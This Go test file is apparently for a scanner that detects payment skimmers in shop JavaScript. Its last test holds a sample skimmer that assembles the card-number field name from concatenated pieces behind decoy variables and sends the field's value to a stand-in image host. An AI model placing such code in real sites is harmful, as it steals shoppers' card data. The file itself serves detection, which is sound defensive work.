package web

import (
	"context"
	"fmt"
	"strings"
	"testing"
)

// A hostile script cannot make the folding slow or deep: nested parentheses, endless chains,
// arrays never joined and unterminated literals cost a few terms a token, within the bound of a
// piece. The work is counted rather than timed, so that a slow runner cannot fail the test.
func TestFoldingHostileScripts(t *testing.T) {
	for name, src := range map[string]string{
		"nesting":    strings.Repeat("(", 200000) + `"a"` + strings.Repeat(")", 200000),
		"chain":      strings.Repeat(`"ab"+`, 100000) + `"c"`,
		"arrays":     strings.Repeat(`["a",`, 100000),
		"open":       strings.Repeat(`'`, 1<<20),
		"templates":  strings.Repeat("`${'", 100000),
		"assignment": strings.Repeat(`var a=a+a;`, 50000) + `var a="xy";`,
		"constant chains": "var a='" + strings.Repeat("a", 4000) + "';" +
			strings.Repeat(strings.Repeat("(", 32)+strings.Repeat("a+", 2000)+"a;", 1<<20/(32+4002)),
	} {
		_, tokens, steps := foldWork([]byte(src), map[string]string{})
		if steps > 8*tokens || steps >= maxFoldSteps {
			t.Errorf("%s: %d terms for %d tokens", name, steps, tokens)
		}
	}
}

// A run past its time stops reading changed scripts for skimmers and says how many were left.
func TestSkimmerSearchStopsWithTheRun(t *testing.T) {
	s := &scanner{budget: newHashBudget(), findings: map[string]int{}, report: AppReport{}}
	s.report.Path = "/var/www/shop"
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	s.inspectCandidates(ctx, skimmerCandidates{others: []FileChange{{Path: "/var/www/shop/a.js"}, {Path: "/var/www/shop/b.js"}}, count: 2})
	if len(s.issues) != 1 || !strings.Contains(s.issues[0], "2 changed scripts not read for skimmers") {
		t.Errorf("issues = %q", s.issues)
	}
}

// Constants are kept from one piece of a script to the next, and thousands of decoys before the
// real one do not push it out.
func TestFoldedConstantsAcrossPiecesAndDecoys(t *testing.T) {
	var decoys strings.Builder
	for i := range maxFoldConstants + 100 {
		fmt.Fprintf(&decoys, "var d%d='x';", i)
	}
	src := []byte(decoys.String() + "var a='c_n';/*" + strings.Repeat("x", 2*skimmerChunk) + "*/var f=document.querySelector('[name=\"'+'payment[c'+a+'umber]'+'\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value")
	var fam skimmerFamilies
	for off := 0; off < len(src); off += skimmerChunk {
		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
	}
	if fam.verdict() == nil {
		t.Error("a constant set two pieces before its use was lost")
	}
}
